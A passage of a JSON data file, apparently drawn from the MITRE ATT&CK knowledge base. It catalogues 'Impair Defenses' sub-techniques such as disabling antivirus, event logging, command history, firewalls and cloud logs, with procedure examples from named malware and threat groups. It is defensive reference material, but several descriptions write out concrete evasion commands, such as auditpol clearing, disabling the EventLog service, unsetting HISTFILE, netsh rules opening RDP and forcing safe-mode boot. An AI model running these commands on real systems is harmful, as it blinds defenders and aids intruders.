                    "S1111": {
                        "ID": "S1111",
                        "Name": "DarkGate",
                        "Description": "<name> will terminate processes associated with several security software products if identified during execution.[32]"
                    },
                    "S0659": {
                        "ID": "S0659",
                        "Name": "Diavol",
                        "Description": "<name> can attempt to stop security software.[33]"
                    },
                    "S0695": {
                        "ID": "S0695",
                        "Name": "Donut",
                        "Description": "<name> can patch Antimalware Scan Interface (AMSI), Windows Lockdown Policy (WLDP), as well as exit-related Native API functions to avoid process termination.[34]"
                    },
                    "S0377": {
                        "ID": "S0377",
                        "Name": "Ebury",
                        "Description": "<name> can disable SELinux Role-Based Access Control and deactivate PAM modules.[35]"
                    },
                    "S0554": {
                        "ID": "S0554",
                        "Name": "Egregor",
                        "Description": "<name> has disabled Windows Defender to evade protections.[36]"
                    },
                    "S0605": {
                        "ID": "S0605",
                        "Name": "EKANS",
                        "Description": "<name> stops processes related to security and management software.[37][38]"
                    },
                    "G1003": {
                        "ID": "G1003",
                        "Name": "Ember Bear",
                        "Description": "<name> has executed a batch script designed to disable Windows Defender on a compromised host.[39]"
                    },
                    "G0037": {
                        "ID": "G0037",
                        "Name": "FIN6",
                        "Description": "<name> has deployed a utility script named kill.bat to disable anti-virus.[40]"
                    },
                    "G0047": {
                        "ID": "G0047",
                        "Name": "Gamaredon Group",
                        "Description": "<name> has delivered macros which can tamper with Microsoft Office security settings.[41]"
                    },
                    "S0249": {
                        "ID": "S0249",
                        "Name": "Gold Dragon",
                        "Description": "<name> terminates anti-malware processes if they\u2019re found running on the system.[18]"
                    },
                    "S0477": {
                        "ID": "S0477",
                        "Name": "Goopy",
                        "Description": "<name> has the ability to disable Microsoft Outlook's security policies to disable macro warnings.[42]"
                    },
                    "G0078": {
                        "ID": "G0078",
                        "Name": "Gorgon Group",
                        "Description": "<name> malware can attempt to disable security features in Microsoft Office and Windows Defender using the taskkill command.[43]"
                    },
                    "S0531": {
                        "ID": "S0531",
                        "Name": "Grandoreiro",
                        "Description": "<name> can hook APIs, kill processes, break file system paths, and change ACLs to prevent security tools from running.[44]"
                    },
                    "S0132": {
                        "ID": "S0132",
                        "Name": "H1N1",
                        "Description": "<name> kills and disables services for Windows Security Center, and Windows Defender.[45]"
                    },
                    "S0061": {
                        "ID": "S0061",
                        "Name": "HDoor",
                        "Description": "<name> kills anti-virus found on the victim.[46]"
                    },
                    "S0601": {
                        "ID": "S0601",
                        "Name": "Hildegard",
                        "Description": "<name> has modified DNS resolvers to evade DNS monitoring tools.[47]"
                    },
                    "S0434": {
                        "ID": "S0434",
                        "Name": "Imminent Monitor",
                        "Description": "<name> has a feature to disable Windows Task Manager.[48]"
                    },
                    "G0119": {
                        "ID": "G0119",
                        "Name": "Indrik Spider",
                        "Description": "<name> used PsExec to leverage Windows Defender to disable scanning of all downloaded files and to restrict real-time monitoring.[49]"
                    },
                    "S0201": {
                        "ID": "S0201",
                        "Name": "JPIN",
                        "Description": "<name> can lower security settings by changing Registry keys.[50]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has been observed turning off Windows Security Center and can hide the AV software window from the view of the infected user.[51][52]"
                    },
                    "S0669": {
                        "ID": "S0669",
                        "Name": "KOCTOPUS",
                        "Description": "<name> will attempt to delete or disable all Registry keys and scheduled tasks related to Microsoft Security Defender and Security Essentials.[53]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> malware TangoDelta attempts to terminate various processes associated with McAfee. Additionally, <name> malware SHARPKNOT disables the Microsoft Windows System Event Notification and Alerter services.[54][55][56][57]."
                    },
                    "S0372": {
                        "ID": "S0372",
                        "Name": "LockerGoga",
                        "Description": "<name> installation has been immediately preceded by a \"task kill\" command in order to disable anti-virus.[58]"
                    },
                    "S1048": {
                        "ID": "S1048",
                        "Name": "macOS.OSAMiner",
                        "Description": "<name> has searched for the Activity Monitor process in the System Events process list and kills the process if running. <name> also searches the operating system's install.log for apps matching its hardcoded list, killing all matching process names.[59]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has disabled antivirus services on targeted systems in order to upload malicious payloads.[60]"
                    },
                    "S0449": {
                        "ID": "S0449",
                        "Name": "Maze",
                        "Description": "<name> has disabled dynamic analysis and other security tools including IDA debugger, x32dbg, and OllyDbg.[61] It has also disabled Windows Defender's Real-Time Monitoring feature and attempted to disable endpoint protection services.[62]"
                    },
                    "S0576": {
                        "ID": "S0576",
                        "Name": "MegaCortex",
                        "Description": "<name> was used to kill endpoint security processes.[63]"
                    },
                    "S0455": {
                        "ID": "S0455",
                        "Name": "Metamorfo",
                        "Description": "<name> has a function to kill processes associated with defenses and can prevent certain processes from launching.[64][65]"
                    },
                    "S0688": {
                        "ID": "S0688",
                        "Name": "Meteor",
                        "Description": "<name> can attempt to uninstall Kaspersky Antivirus or remove the Kaspersky license; it can also add all files and folders related to the attack to the Windows Defender exclusion list.[66]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> can disable the system's local proxy settings.[67]"
                    },
                    "S0228": {
                        "ID": "S0228",
                        "Name": "NanHaiShu",
                        "Description": "<name> can change Internet Explorer settings to reduce warnings about malware activity.[68]"
                    },
                    "S0336": {
                        "ID": "S0336",
                        "Name": "NanoCore",
                        "Description": "<name> can modify the victim's anti-virus.[69][70]"
                    },
                    "S0457": {
                        "ID": "S0457",
                        "Name": "Netwalker",
                        "Description": "<name> can detect and terminate active security software-related processes on infected systems.[71][72]"
                    },
                    "C0002": {
                        "ID": "C0002",
                        "Name": "Night Dragon",
                        "Description": "During <name>, threat actors disabled anti-virus and anti-spyware tools in some instances on the victim\u2019s machines. The actors also disabled proxy settings to allow direct communication from victims to the Internet.[73]"
                    },
                    "S0223": {
                        "ID": "S0223",
                        "Name": "POWERSTATS",
                        "Description": "<name> can disable Microsoft Office Protected View by changing Registry keys.[74]"
                    },
                    "S0279": {
                        "ID": "S0279",
                        "Name": "Proton",
                        "Description": "<name> kills security tools like Wireshark that are running.[75]"
                    },
                    "G0024": {
                        "ID": "G0024",
                        "Name": "Putter Panda",
                        "Description": "Malware used by <name> attempts to terminate processes corresponding to two components of Sophos Anti-Virus (SAVAdminService.exe and SavService.exe).[76]"
                    },
                    "S0583": {
                        "ID": "S0583",
                        "Name": "Pysa",
                        "Description": "<name> has the capability to stop antivirus services and disable Windows Defender.[77]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "<name> has the ability to modify the Registry to add its binaries to the Windows Defender exclusion list.[78]"
                    },
                    "S0481": {
                        "ID": "S0481",
                        "Name": "Ragnar Locker",
                        "Description": "<name> has attempted to terminate/stop processes and services associated with endpoint security products.[79]"
                    },
                    "S0496": {
                        "ID": "S0496",
                        "Name": "REvil",
                        "Description": "<name> can connect to and disable the Symantec server on the victim's network.[80]"
                    },
                    "S0400": {
                        "ID": "S0400",
                        "Name": "RobbinHood",
                        "Description": "<name> will search for Windows services that are associated with antivirus software on the system and kill the process.[81]"
                    },
                    "G0106": {
                        "ID": "G0106",
                        "Name": "Rocke",
                        "Description": "<name> used scripts which detected and uninstalled antivirus software.[82][83]"
                    },
                    "S0253": {
                        "ID": "S0253",
                        "Name": "RunningRAT",
                        "Description": "<name> kills antimalware running process.[18]"
                    },
                    "S0446": {
                        "ID": "S0446",
                        "Name": "Ryuk",
                        "Description": "<name> has stopped services related to anti-virus.[84]"
                    },
                    "S0692": {
                        "ID": "S0692",
                        "Name": "SILENTTRINITY",
                        "Description": "<name>'s amsiPatch.py module can disable Antimalware Scan Interface (AMSI) functions.[85]"
                    },
                    "S0468": {
                        "ID": "S0468",
                        "Name": "Skidmap",
                        "Description": "<name> has the ability to set SELinux to permissive mode.[86]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 used the service control manager on a remote system to disable services associated with security monitoring products.[87]"
                    },
                    "S0058": {
                        "ID": "S0058",
                        "Name": "SslMM",
                        "Description": "<name> identifies and kills anti-malware processes.[46]"
                    },
                    "S0491": {
                        "ID": "S0491",
                        "Name": "StrongPity",
                        "Description": "<name> can add directories used by the malware to the Windows Defender exclusions list to prevent detection.[88]"
                    },
                    "S0559": {
                        "ID": "S0559",
                        "Name": "SUNBURST",
                        "Description": "<name> attempted to disable software security services following checks against a FNV-1a + XOR hashed hardcoded blocklist.[89]"
                    },
                    "G1018": {
                        "ID": "G1018",
                        "Name": "TA2541",
                        "Description": "<name>  has attempted to disable built-in security protections such as Windows AMSI. [90]"
                    },
                    "G0092": {
                        "ID": "G0092",
                        "Name": "TA505",
                        "Description": "<name> has used malware to disable Windows Defender.[91]"
                    },
                    "G0139": {
                        "ID": "G0139",
                        "Name": "TeamTNT",
                        "Description": "<name> has disabled and uninstalled security tools such as Alibaba, Tencent, and BMC cloud monitoring agents on cloud-based infrastructure.[92][93]"
                    },
                    "S0595": {
                        "ID": "S0595",
                        "Name": "ThiefQuest",
                        "Description": "<name> uses the function kill_unwanted to obtain a list of running processes and kills each process matching a list of security related processes.[94]"
                    },
                    "S0004": {
                        "ID": "S0004",
                        "Name": "TinyZBot",
                        "Description": "<name> can disable Avira anti-virus.[95]"
                    },
                    "S0266": {
                        "ID": "S0266",
                        "Name": "TrickBot",
                        "Description": "<name> can disable Windows Defender.[96]"
                    },
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "<name> has used a AMSI bypass, which patches the in-memory amsi.dll, in PowerShell scripts to bypass Windows antimalware products.[97]"
                    },
                    "S0130": {
                        "ID": "S0130",
                        "Name": "Unknown Logger",
                        "Description": "<name> has functionality to disable security tools, including Kaspersky, BitDefender, and MalwareBytes.[98]"
                    },
                    "S0670": {
                        "ID": "S0670",
                        "Name": "WarzoneRAT",
                        "Description": "<name> can disarm Windows Defender during the UAC process to evade detection.[99]"
                    },
                    "S0689": {
                        "ID": "S0689",
                        "Name": "WhisperGate",
                        "Description": "<name> can download and execute AdvancedRun.exe to disable the Windows Defender Theat Protection service and set an exclusion path for the C:\\ drive.[100][101][102]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has shut down or uninstalled security applications on victim systems that might prevent ransomware from executing.[103][104][105][106]"
                    },
                    "S1114": {
                        "ID": "S1114",
                        "Name": "ZIPLINE",
                        "Description": "<name> can add itself to the exclusion list for the Ivanti Connect Secure Integrity Checker Tool if the --exclude parameter is passed by the tar process.[107]"
                    },
                    "S0412": {
                        "ID": "S0412",
                        "Name": "ZxShell",
                        "Description": "<name> can kill AV products' processes.[108]"
                    }
                }
            },
            "002": {
                "name": "Disable Windows Event Logging",
                "href": "/techniques/T1562/002",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.[1] This data is used by security tools and analysts to generate detections.The EventLog service maintains event logs from various system components and applications.[2] By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to Security Settings\\Local Policies\\Audit Policy for basic audit policy settings or Security Settings\\Advanced Audit Policy Configuration for advanced audit policy settings.[3][4] auditpol.exe may also be used to set audit policies.[5]Adversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the Set-Service -Name EventLog -Status Stopped or sc config eventlog start=disabled commands (followed by manually stopping the service using Stop-Service  -Name EventLog).[6][7] Additionally, the service may be disabled by modifying the \"Start\" value in HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog then restarting the system for the change to take effect.[7]There are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security, then reboot the system to disable the Security EventLog.[8] Second, with Administrator privilege, adversaries may modify the same values in HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System and HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application to disable the entire EventLog.[7]Additionally, adversaries may use auditpol and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the /success or /failure parameters. For example, auditpol /set /category:\"Account Logon\" /success:disable /failure:disable turns off auditing for the Account Logon category.[9][10] To clear the audit policy, adversaries may run the following lines: auditpol /clear /y or auditpol /remove /allusers.[10]By disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "Procedure": {
                    "C0025": {
                        "ID": "C0025",
                        "Name": "2016 Ukraine Electric Power Attack",
                        "Description": "During the <name>, Sandworm Team disabled event logging on compromised systems.[11]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has executed scripts to disable the event log service.[12]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29, used AUDITPOL to prevent the collection of audit logs.[13]"
                    },
                    "G0027": {
                        "ID": "G0027",
                        "Name": "Threat Group-3390",
                        "Description": "<name> has used appcmd.exe to disable logging on a victim server.[14]"
                    },
                    "S0645": {
                        "ID": "S0645",
                        "Name": "Wevtutil",
                        "Description": "<name> can be used to disable specific event logs on the system.[15]"
                    }
                }
            },
            "003": {
                "name": "Impair Command History Logging",
                "href": "/techniques/T1562/003",
                "description": "Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. On Linux and macOS, command history is tracked in a file pointed to by the environment variable HISTFILE. When a user logs off a system, this information is flushed to a file in the user's home directory called ~/.bash_history. The HISTCONTROL environment variable keeps track of what should be saved by the history command and eventually into the ~/.bash_history file when a user logs out. HISTCONTROL does not exist by default on macOS, but can be set by the user and will be respected.Adversaries may clear the history environment variable (unset HISTFILE) or set the command history size to zero (export HISTFILESIZE=0) to prevent logging of commands. Additionally, HISTCONTROL can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". HISTCONTROL can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \" ls\" will not be saved, but \"ls\" would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands. On Windows systems, the PSReadLine module tracks commands used in all PowerShell sessions and writes them to a file ($env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt by default). Adversaries may change where these logs are saved using Set-PSReadLineOption -HistorySavePath {File Path}. This will cause ConsoleHost_history.txt to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command Set-PSReadlineOption -HistorySaveStyle SaveNothing.[1][2][3]Adversaries may also leverage a Network Device CLI on network devices to disable historical command logging (e.g. no logging).",
                "Procedure": {
                    "G0082": {
                        "ID": "G0082",
                        "Name": "APT38",
                        "Description": "<name> has prepended a space to all of their terminal commands to operate without leaving traces in the HISTCONTROL environment.[4]"
                    },
                    "S0692": {
                        "ID": "S0692",
                        "Name": "SILENTTRINITY",
                        "Description": "<name> can bypass ScriptBlock logging to execute unmanaged PowerShell code from memory.[5]"
                    }
                }
            },
            "004": {
                "name": "Disable or Modify System Firewall",
                "href": "/techniques/T1562/004",
                "description": "Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.Modifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. Non-Standard Port).[1]Adversaries may also modify host networking settings that indirectly manipulate system firewalls, such as interface bandwidth or network connection request thresholds.[2] Settings related to enabling abuse of various Remote Services may also indirectly modify firewall rules.",
                "Procedure": {
                    "G0082": {
                        "ID": "G0082",
                        "Name": "APT38",
                        "Description": "<name> have created firewall exemptions on specific ports, including ports 443, 6443, 8443, and 9443.[3]"
                    },
                    "S0031": {
                        "ID": "S0031",
                        "Name": "BACKSPACE",
                        "Description": "The \"ZR\" variant of <name> will check to see if known host-based firewalls are installed on the infected systems. <name> will attempt to establish a C2 channel, then will examine open windows to identify a pop-up from the firewall software and will simulate a mouse-click to allow the connection to proceed.[4]"
                    },
                    "S0245": {
                        "ID": "S0245",
                        "Name": "BADCALL",
                        "Description": "<name> disables the Windows firewall before binding to a port.[5]"
                    },
                    "G0008": {
                        "ID": "G0008",
                        "Name": "Carbanak",
                        "Description": "<name> may use netsh to add local firewall rule exceptions.[6]"
                    },
                    "S0492": {
                        "ID": "S0492",
                        "Name": "CookieMiner",
                        "Description": "<name> has checked for the presence of \"Little Snitch\", macOS network monitoring and application firewall software, stopping and exiting if it is found.[7]"
                    },
                    "S0687": {
                        "ID": "S0687",
                        "Name": "Cyclops Blink",
                        "Description": "<name> can modify the Linux iptables firewall to enable C2 communication on network devices via a stored list of port numbers.[8][9]"
                    },
                    "S0334": {
                        "ID": "S0334",
                        "Name": "DarkComet",
                        "Description": "<name> can disable Security Center functions like the Windows Firewall.[10][11]"
                    },
                    "G0035": {
                        "ID": "G0035",
                        "Name": "Dragonfly",
                        "Description": "<name> has disabled host-based firewalls. The group has also globally opened port 3389.[12]"
                    },
                    "S0531": {
                        "ID": "S0531",
                        "Name": "Grandoreiro",
                        "Description": "<name> can block the Deibold Warsaw GAS Tecnologia security tool at the firewall level.[13]"
                    },
                    "S0132": {
                        "ID": "S0132",
                        "Name": "H1N1",
                        "Description": "<name> kills and disables services for Windows Firewall.[14]"
                    },
                    "S0246": {
                        "ID": "S0246",
                        "Name": "HARDRAIN",
                        "Description": "<name> opens the Windows Firewall to modify incoming connections.[15]"
                    },
                    "S0376": {
                        "ID": "S0376",
                        "Name": "HOPLIGHT",
                        "Description": "<name> has modified the firewall using netsh.[16]"
                    },
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> has a command to disable routing and the Firewall on the victim\u2019s machine.[17]"
                    },
                    "S0088": {
                        "ID": "S0088",
                        "Name": "Kasidet",
                        "Description": "<name> has the ability to change firewall settings to allow a plug-in to be downloaded.[18]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has been observed disabling the system firewall.[19]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "Various <name> malware modifies the Windows firewall to allow incoming connections or disable it entirely using netsh. [20][21][22]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has added the following rule to a victim's Windows firewall to allow RDP traffic - \"netsh\" advfirewall firewall add rule name=\"Terminal Server\" dir=in action=allow protocol=TCP localport=3389.[23][24]"
                    },
                    "G1009": {
                        "ID": "G1009",
                        "Name": "Moses Staff",
                        "Description": "<name> has used batch scripts that can disable the Windows firewall on specific remote machines.[25]"
                    },
                    "S0336": {
                        "ID": "S0336",
                        "Name": "NanoCore",
                        "Description": "<name> can modify the victim's firewall.[26][27]"
                    },
                    "S0108": {
                        "ID": "S0108",
                        "Name": "netsh",
                        "Description": "<name> can be used to disable local firewall settings.[28][29]"
                    },
                    "S0385": {
                        "ID": "S0385",
                        "Name": "njRAT",
                        "Description": "<name> has modified the Windows firewall to allow itself to communicate through the firewall.[30][31]"
                    },
                    "C0014": {
                        "ID": "C0014",
                        "Name": "Operation Wocao",
                        "Description": "During <name>, threat actors used PowerShell to add and delete rules in the Windows firewall.[32]"
                    },
                    "S1032": {
                        "ID": "S1032",
                        "Name": "PyDCrypt",
                        "Description": "<name> has modified firewall rules to allow incoming SMB, NetBIOS, and RPC connections using netsh.exe on remote machines.[25]"
                    },
                    "S0125": {
                        "ID": "S0125",
                        "Name": "Remsec",
                        "Description": "<name> can add or remove applications or ports on the Windows firewall or disable it entirely.[33]"
                    },
                    "G0106": {
                        "ID": "G0106",
                        "Name": "Rocke",
                        "Description": "<name> used scripts which killed processes and added firewall rules to block traffic related to other cryptominers.[34]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 used netsh to configure firewall rules that limited certain UDP outbound packets.[35]"
                    },
                    "G0139": {
                        "ID": "G0139",
                        "Name": "TeamTNT",
                        "Description": "<name> has disabled iptables.[36]"
                    },
                    "G1022": {
                        "ID": "G1022",
                        "Name": "ToddyCat",
                        "Description": "Prior to executing a backdoor <name>  has run cmd /c start /b netsh advfirewall firewall add rule name=\"SGAccessInboundRule\" dir=in protocol=udp action=allow localport=49683 to allow the targeted system to receive UDP packets on port 49683.[37]"
                    },
                    "S0263": {
                        "ID": "S0263",
                        "Name": "TYPEFRAME",
                        "Description": "<name> can open the Windows Firewall on the victim\u2019s machine to allow incoming connections.[38]"
                    },
                    "S0412": {
                        "ID": "S0412",
                        "Name": "ZxShell",
                        "Description": "<name> can disable the firewall by modifying the registry key HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile.[39]"
                    }
                }
            },
            "006": {
                "name": "Indicator Blocking",
                "href": "/techniques/T1562/006",
                "description": "An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting[1] or even disabling host-based sensors, such as Event Tracing for Windows (ETW)[2], by tampering settings that control the collection and flow of event telemetry.[3] These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as PowerShell or Windows Management Instrumentation.For example, adversaries may modify the File value in HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Security to hide their malicious actions in a new or different .evtx log file. This action does not require a system reboot and takes effect immediately.[4] ETW interruption can be achieved multiple ways, however most directly by defining conditions using the PowerShell Set-EtwTraceProvider cmdlet or by interfacing directly with the Registry to make alterations.In the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.In Linux environments, adversaries may disable or reconfigure log processing tools such as syslog or nxlog to inhibit detection and monitoring capabilities to facilitate follow on behaviors [5].",
                "Procedure": {
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> developed a custom injector that enables an Event Tracing for Windows (ETW) bypass, making malicious processes invisible to Windows logging.[6]"
                    },
                    "G1023": {
                        "ID": "G1023",
                        "Name": "APT5",
                        "Description": "<name> has used the CLEANPULSE utility to insert command line strings into a targeted process to prevent certain log events from occurring.[7]"
                    },
                    "S1063": {
                        "ID": "S1063",
                        "Name": "Brute Ratel C4",
                        "Description": "<name> has the ability to hide memory artifacts and to patch Event Tracing for Windows (ETW) and the Anti Malware Scan Interface (AMSI).[8][9]"
                    },
                    "S0377": {
                        "ID": "S0377",
                        "Name": "Ebury",
                        "Description": "<name> can hook logging functions so that nothing from the backdoor gets sent to the logging facility.[10]"
                    },
                    "S0697": {
                        "ID": "S0697",
                        "Name": "HermeticWiper",
                        "Description": "<name> has the ability to set the HKLM:\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\CrashControl\\CrashDumpEnabled Registry key to 0 in order to disable crash dumps.[11][12][13]"
                    },
                    "S1097": {
                        "ID": "S1097",
                        "Name": "HUI Loader",
                        "Description": "<name> has the ability to disable Windows Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI) functions.[14]"
                    },
                    "S0579": {
                        "ID": "S0579",
                        "Name": "Waterbear",
                        "Description": "<name> can hook the ZwOpenProcess and GetExtendedTcpTable APIs called by the process of a security product to hide PIDs and TCP records from detection.[15]"
                    },
                    "S1065": {
                        "ID": "S1065",
                        "Name": "Woody RAT",
                        "Description": "<name> has suppressed all error reporting by calling SetErrorMode with 0x8007 as a parameter.[16]"
                    }
                }
            },
            "007": {
                "name": "Disable or Modify Cloud Firewall",
                "href": "/techniques/T1562/007",
                "description": "Adversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources. Cloud firewalls are separate from system firewalls that are described in Disable or Modify System Firewall. Cloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols. An adversary may introduce new firewall rules or policies to allow access into a victim cloud environment. For example, an adversary may use a script or utility that creates new ingress rules in existing security groups to allow any TCP/IP connectivity, or remove networking limitations to support traffic associated with malicious activity (such as cryptomining).[1][2]Modifying or disabling a cloud firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed.",
                "Procedure": {
                    "S1091": {
                        "ID": "S1091",
                        "Name": "Pacu",
                        "Description": "<name> can allowlist IP addresses in AWS GuardDuty.[3]"
                    }
                }
            },
            "008": {
                "name": "Disable or Modify Cloud Logs",
                "href": "/techniques/T1562/008",
                "description": "An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities.For example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.[1] They may alternatively tamper with logging functionality \u2013 for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files.[2][3] In Office 365, an adversary may disable logging on mail collection activities for specific users by using the Set-MailboxAuditBypassAssociation cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user\u2019s license from an Enterprise E5 to an Enterprise E3 license.[4]",
                "Procedure": {
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has disabled Purview Audit on targeted accounts prior to stealing emails from  Microsoft 365 tenants.[5]"
                    },
                    "S1091": {
                        "ID": "S1091",
                        "Name": "Pacu",
                        "Description": "<name> can disable or otherwise restrict various AWS logging services, such as AWS CloudTrail and VPC flow logs.[6]"
                    }
                }
            },
            "009": {
                "name": "Safe Mode Boot",
                "href": "/techniques/T1562/009",
                "description": "Adversaries may abuse Windows safe mode to disable endpoint defenses. Safe mode starts up the Windows operating system with a limited set of drivers and services. Third-party security software such as endpoint detection and response (EDR) tools may not start after booting Windows in safe mode. There are two versions of safe mode: Safe Mode and Safe Mode with Networking. It is possible to start additional services after a safe mode boot.[1][2]Adversaries may abuse safe mode to disable endpoint defenses that may not start with a limited boot. Hosts can be forced into safe mode after the next reboot via modifications to Boot Configuration Data (BCD) stores, which are files that manage boot application settings.[3]Adversaries may also add their malicious applications to the list of minimal services that start in safe mode by modifying relevant Registry values (i.e. Modify Registry). Malicious Component Object Model (COM) objects may also be registered and loaded in safe mode.[2][4][5][6]",
                "Procedure": {
                    "S1053": {
                        "ID": "S1053",
                        "Name": "AvosLocker",
                        "Description": "<name> can restart a compromised machine in safe mode.[7][8]"
                    },
                    "S1070": {
                        "ID": "S1070",
                        "Name": "Black Basta",
                        "Description": "<name> can reboot victim machines in safe mode with networking via bcdedit /set safeboot network.[9][10][11][12][13]"
                    },
                    "S0496": {
                        "ID": "S0496",
                        "Name": "REvil",
                        "Description": "<name> can force a reboot in safe mode with networking.[6]"
                    }
                }
            },
            "010": {
                "name": "Downgrade Attack",
                "href": "/techniques/T1562/010",
                "description": "Adversaries may downgrade or use a version of system features that may be outdated, vulnerable, and/or does not support updated security controls. Downgrade attacks typically take advantage of a system\u2019s backward compatibility to force it into less secure modes of operation. Adversaries may downgrade and use various less-secure versions of features of a system, such as Command and Scripting Interpreters or even network protocols that can be abused to enable Adversary-in-the-Middle or Network Sniffing.[1] For example, PowerShell versions 5+ includes Script Block Logging (SBL) which can record executed script content. However, adversaries may attempt to execute a previous version of PowerShell that does not support SBL with the intent to Impair Defenses while running malicious scripts that may have otherwise been detected.[2][3][4]Adversaries may similarly target network traffic to downgrade from an encrypted HTTPS connection to an unsecured HTTP connection that exposes network data in clear text.[5][6]",
                "Procedure": {}
            },
            "011": {
                "name": "Spoof Security Alerting",
                "href": "/techniques/T1562/011",
                "description": "Adversaries may spoof security alerting from tools, presenting false evidence to impair defenders\u2019 awareness of malicious activity.[1] Messages produced by defensive tools contain information about potential security events as well as the functioning status of security software and the system. Security reporting messages are important for monitoring the normal operation of a system and identifying important events that can signal a security incident.Rather than or in addition to Indicator Blocking, an adversary can spoof positive affirmations that security tools are continuing to function even after legitimate security tools have been disabled (e.g., Disable or Modify Tools). An adversary can also present a \"healthy\" system status even after infection. This can be abused to enable further malicious activity by delaying defender responses.For example, adversaries may show a fake Windows Security GUI and tray icon with a \"healthy\" system status after Windows Defender and other system tools have been disabled.[1]",
                "Procedure": {}
            },
            "012": {
                "name": "Disable or Modify Linux Audit System",
                "href": "/techniques/T1562/012",
                "description": "Adversaries may disable or modify the Linux audit system to hide malicious activity and avoid detection. Linux admins use the Linux Audit system to track security-relevant information on a system. The Linux Audit system operates at the kernel-level and maintains event logs on application and system activity such as process, network, file, and login events based on pre-configured rules.Often referred to as auditd, this is the name of the daemon used to write events to disk and is governed by the parameters set in the audit.conf configuration file. Two primary ways to configure the log generation rules are through the command line auditctl utility and the file /etc/audit/audit.rules,  containing a sequence of auditctl commands loaded at boot time.[1][2]With root privileges, adversaries may be able to ensure their activity is not logged through disabling the Audit system service, editing the configuration/rule files, or by hooking the Audit system library functions. Using the command line, adversaries can disable the Audit system service through killing processes associated with auditd daemon or use systemctl to stop the Audit service. Adversaries can also hook Audit system functions to disable logging or modify the rules contained in the /etc/audit/audit.rules or audit.conf files to ignore malicious activity.[3][4]",
                "Procedure": {}
            }
        },
